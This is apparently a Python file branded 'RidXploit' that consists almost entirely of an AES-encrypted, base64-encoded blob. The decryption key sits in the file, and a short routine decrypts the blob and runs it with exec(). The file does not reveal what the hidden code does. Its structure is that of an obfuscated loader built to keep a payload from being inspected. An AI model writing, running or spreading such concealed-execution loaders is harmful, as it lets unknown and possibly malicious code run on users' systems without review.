# This file has been encrypted using AES and base64 by RidXploit

encrypted_code = "RidXploit_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_RidXploit"
key = bytes.fromhex("01dd0c114355e0bfc7a5d9f7cd8216fe16ca7297121cebc8bd30485c282a9719")


import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def aes_decrypt(data, key):
    data = base64.b64decode(data.replace("RidXploit_", "").replace("_RidXploit", ""))
    iv = data[:16]
    ciphertext = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted

# Decrypt and execute the Python code
decrypted_code = aes_decrypt(encrypted_code, key)
exec(decrypted_code.decode('utf-8'))
